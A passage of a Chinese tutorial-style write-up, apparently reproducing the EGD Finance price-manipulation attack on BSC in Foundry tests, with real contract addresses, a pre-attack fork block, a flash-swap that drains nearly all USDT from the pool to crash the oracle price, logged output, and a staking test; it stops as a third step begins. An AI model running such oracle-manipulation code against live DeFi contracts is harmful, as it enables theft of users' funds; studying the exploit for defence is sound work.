+<h3 id="操纵edgusdt的价格-让edg非常便宜">操纵EDG/USDT的价格, 让EDG非常便宜</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">10</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;forge-std/test.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">interface</span> <span class="nc">IPancakePair</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">swap</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">amount0Out</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">amount1Out</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span> <span class="n">to</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">bytes</span> <span class="n">calldata</span> <span class="nb">data</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="k">external</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">interface</span> <span class="nc">IEGD_Finance</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">getEGDPrice</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">interface</span> <span class="nc">IERC20</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">transfer</span><span class="p">(</span><span class="kt">address</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="nb">value</span><span class="p">)</span> <span class="k">external</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">balanceOf</span><span class="p">(</span><span class="kt">address</span> <span class="n">owner</span><span class="p">)</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//BSC_USDT合约地址
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">address</span> <span class="k">constant</span> <span class="n">usdt</span> <span class="o">=</span> <span class="mh">0x55d398326f99059fF775485246999027B3197955</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//EGD_Finance合约地址
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">address</span> <span class="k">constant</span> <span class="n">EGD_Finance</span> <span class="o">=</span> <span class="mh">0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//攻击发生前的区块高度
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">uint256</span> <span class="k">constant</span> <span class="n">blockheight</span> <span class="o">=</span> <span class="mi">20245522</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//LPs
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">IPancakePair</span> <span class="k">constant</span> <span class="n">EGD_USDT_LPPool</span> <span class="o">=</span> <span class="n">IPancakePair</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0xa361433E409Adac1f87CDF133127585F8a93c67d</span>
+</span></span><span class="line"><span class="cl"><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">PriceManipulateTest</span> <span class="k">is</span> <span class="n">Test</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">IEGD_Finance</span> <span class="n">egdFinance</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">setUp</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    		<span class="c1">//fork 攻击发生前的网络
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">vm</span><span class="p">.</span><span class="n">createSelectFork</span><span class="p">(</span><span class="s">&#34;https://rpc.ankr.com/bsc&#34;</span><span class="p">,</span> <span class="n">blockheight</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">egdFinance</span> <span class="o">=</span> <span class="n">IEGD_Finance</span><span class="p">(</span><span class="n">EGD_Finance</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">//假设我们的账户上有一些USDT
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">deal</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">usdt</span><span class="p">),</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="mi">30000</span> <span class="o">*</span> <span class="mi">1</span> <span class="kc">ether</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">testPrice</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">console2</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;edg price before:&#34;</span><span class="p">,</span> <span class="n">egdFinance</span><span class="p">.</span><span class="n">getEGDPrice</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">				
+</span></span><span class="line"><span class="cl">				<span class="c1">//借出99.99%的USDT, 让USDT变得非常稀少
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">uint256</span> <span class="n">borrowUSDT</span> <span class="o">=</span> <span class="p">(</span><span class="n">IERC20</span><span class="p">(</span><span class="n">usdt</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">EGD_USDT_LPPool</span><span class="p">))</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">            <span class="mi">9</span><span class="n">_999_999_925</span><span class="p">)</span> <span class="o">/</span> <span class="mi">10</span><span class="n">_000_000_000</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">EGD_USDT_LPPool</span><span class="p">.</span><span class="n">swap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">borrowUSDT</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="s">&#34;abcd&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">console2</span><span class="p">.</span><span class="n">log</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;edg price after (i return the borrowed USDT back):&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">egdFinance</span><span class="p">.</span><span class="n">getEGDPrice</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">pancakeCall</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">count1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">bytes</span> <span class="n">calldata</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">console2</span><span class="p">.</span><span class="n">log</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;edg price after (i borrowed huge USDT out):&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">egdFinance</span><span class="p">.</span><span class="n">getEGDPrice</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">bool</span> <span class="n">success</span> <span class="o">=</span> <span class="n">IERC20</span><span class="p">(</span><span class="n">usdt</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">address</span><span class="p">(</span><span class="n">EGD_USDT_LPPool</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="p">((</span><span class="n">count1</span> <span class="o">*</span> <span class="mi">10</span><span class="n">_500_000_000</span><span class="p">)</span> <span class="o">/</span> <span class="mi">10</span><span class="n">_000_000_000</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span> <span class="c1">//归还本金 + 5%手续费
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>输出:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">~/Desktop/EGDFinanceDemo main !2 9 ❯ forge test --match-contract PriceManipulateTest  
+</span></span><span class="line"><span class="cl">[⠑] Compiling...
+</span></span><span class="line"><span class="cl">[⠒] Compiling 1 files with 0.8.17
+</span></span><span class="line"><span class="cl">[⠆] Solc 0.8.17 finished in 2.36s
+</span></span><span class="line"><span class="cl">Compiler run successful
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Running 1 test for test/PriceManipulate.t.sol:PriceManipulateTest
+</span></span><span class="line"><span class="cl">[PASS] testPrice() (gas: 90127)
+</span></span><span class="line"><span class="cl">Logs:
+</span></span><span class="line"><span class="cl">  edg price before: 8093644493314726
+</span></span><span class="line"><span class="cl">  edg price after (i borrowed huge USDT out): 60702333
+</span></span><span class="line"><span class="cl">  edg price after (i return the borrowed USDT back): 8498326714945346
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到在我借出大量USDT后 和 归还借出的USDT前, EDG的价格由 8093644493314726 变成了 60702333,</p>
+<p>归还USDT后价格又恢复了.</p>
+<h3 id="质押usdt获取edg奖励">质押USDT获取EDG奖励</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;forge-std/test.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">address</span> <span class="k">constant</span> <span class="n">EGD_Finance</span> <span class="o">=</span> <span class="mh">0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">address</span> <span class="k">constant</span> <span class="n">usdt</span> <span class="o">=</span> <span class="mh">0x55d398326f99059fF775485246999027B3197955</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">address</span> <span class="k">constant</span> <span class="n">egd</span> <span class="o">=</span> <span class="mh">0x202b233735bF743FA31abb8f71e641970161bF98</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kt">uint256</span> <span class="k">constant</span> <span class="n">blockheight</span> <span class="o">=</span> <span class="mi">20245522</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">interface</span> <span class="nc">IEGD_Finance</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">bond</span><span class="p">(</span><span class="kt">address</span> <span class="n">invitor</span><span class="p">)</span> <span class="k">external</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">stake</span><span class="p">(</span><span class="kt">uint256</span> <span class="n">amount</span><span class="p">)</span> <span class="k">external</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">calculateAll</span><span class="p">(</span><span class="kt">address</span> <span class="n">addr</span><span class="p">)</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">claimAllReward</span><span class="p">()</span> <span class="k">external</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">getEGDPrice</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">userInfo</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">address</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">external</span>
+</span></span><span class="line"><span class="cl">        <span class="k">view</span>
+</span></span><span class="line"><span class="cl">        <span class="k">returns</span> <span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">uint256</span> <span class="n">totalAmount</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">uint256</span> <span class="n">totalClaimed</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">address</span> <span class="n">invitor</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">bool</span> <span class="n">isRefer</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">uint256</span> <span class="n">refer</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">uint256</span> <span class="n">referReward</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">interface</span> <span class="nc">IERC20</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">decimals</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint8</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">balanceOf</span><span class="p">(</span><span class="kt">address</span> <span class="n">owner</span><span class="p">)</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">approve</span><span class="p">(</span><span class="kt">address</span> <span class="n">spender</span><span class="p">,</span> <span class="kt">uint256</span> <span class="nb">value</span><span class="p">)</span> <span class="k">external</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">transfer</span><span class="p">(</span><span class="kt">address</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="nb">value</span><span class="p">)</span> <span class="k">external</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">StakeTest</span> <span class="k">is</span> <span class="n">Test</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">IEGD_Finance</span> <span class="n">egd_finance</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">setUp</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">createSelectFork</span><span class="p">(</span><span class="s">&#34;https://rpc.ankr.com/bsc&#34;</span><span class="p">,</span> <span class="n">blockheight</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">egd_finance</span> <span class="o">=</span> <span class="n">IEGD_Finance</span><span class="p">(</span><span class="n">EGD_Finance</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">deal</span><span class="p">(</span><span class="n">usdt</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="mi">10000</span> <span class="o">*</span> <span class="mi">10</span><span class="n">e18</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">testStake</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="cm">/**
+</span></span></span><span class="line"><span class="cl"><span class="cm">        如何找到一个推荐人地址
+</span></span></span><span class="line"><span class="cl"><span class="cm">        到合约地址egd_finance  https://bscscan.com/address/0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370#events
+</span></span></span><span class="line"><span class="cl"><span class="cm">        查看事件，用cast 4byte-event &lt;topic0&gt;， 如果结果是Claim(address,uint256)， 那么topic1就是领取质押奖励的人的地址
+</span></span></span><span class="line"><span class="cl"><span class="cm">        用它当推荐人就可以了。注意， topic1中的地址需要用工具toChecksumAddress转换一下，比如https://web3-tools.netlify.app
+</span></span></span><span class="line"><span class="cl"><span class="cm">         */</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">//填写推荐人
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">egd_finance</span><span class="p">.</span><span class="n">bond</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="mh">0x85cbfaBD709c744C84A36BA47145396d724EE751</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">//批准egd_finance操作我们的usdt
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">IERC20</span><span class="p">(</span><span class="n">usdt</span><span class="p">).</span><span class="n">approve</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">egd_finance</span><span class="p">),</span> <span class="mi">100</span> <span class="kc">ether</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">//质押
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">egd_finance</span><span class="p">.</span><span class="n">stake</span><span class="p">(</span><span class="mi">100</span> <span class="kc">ether</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="kt">uint256</span> <span class="n">totalAmount</span><span class="p">,</span> <span class="p">,</span> <span class="p">,</span> <span class="p">,</span> <span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="n">egd_finance</span><span class="p">.</span><span class="n">userInfo</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">console2</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;usdt i staked:&#34;</span><span class="p">,</span> <span class="n">totalAmount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">console2</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;edg i have:&#34;</span><span class="p">,</span> <span class="n">IERC20</span><span class="p">(</span><span class="n">egd</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)));</span>
+</span></span><span class="line"><span class="cl">        <span class="n">assertEq</span><span class="p">(</span><span class="mi">100</span> <span class="kc">ether</span><span class="p">,</span> <span class="n">totalAmount</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">//模拟2天后
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">vm</span><span class="p">.</span><span class="n">warp</span><span class="p">(</span><span class="nb">block</span><span class="p">.</span><span class="nb">timestamp</span> <span class="o">+</span> <span class="p">(</span><span class="mi">2</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">*</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">60</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">//领取奖励
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">egd_finance</span><span class="p">.</span><span class="n">claimAllReward</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">console2</span><span class="p">.</span><span class="n">log</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="s">&#34;edg i get from the stake reward (2 days later):&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">IERC20</span><span class="p">(</span><span class="n">egd</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>输出</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">~/Desktop/EGDFinanceDemo main !2 9 ❯ forge test --match-contract StakeTest  -vv
+</span></span><span class="line"><span class="cl">[⠑] Compiling...
+</span></span><span class="line"><span class="cl">[⠢] Compiling 1 files with 0.8.17
+</span></span><span class="line"><span class="cl">[⠆] Solc 0.8.17 finished in 2.41s
+</span></span><span class="line"><span class="cl">Compiler run successful
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Running 1 test for test/Stake.t.sol:StakeTest
+</span></span><span class="line"><span class="cl">[PASS] testStake() (gas: 868614)
+</span></span><span class="line"><span class="cl">Logs:
+</span></span><span class="line"><span class="cl">  usdt i staked: 100000000000000000000
+</span></span><span class="line"><span class="cl">  edg i have: 0
+</span></span><span class="line"><span class="cl">  edg i get from the stake reward (2 days later): 135123268981974350000
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到, 在正常情况下 质押 100个USDT, 2天后大约能获取135个EDG</p>
+<h3 id="在操纵价格后获取edg奖励">在操纵价格后获取EDG奖励</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
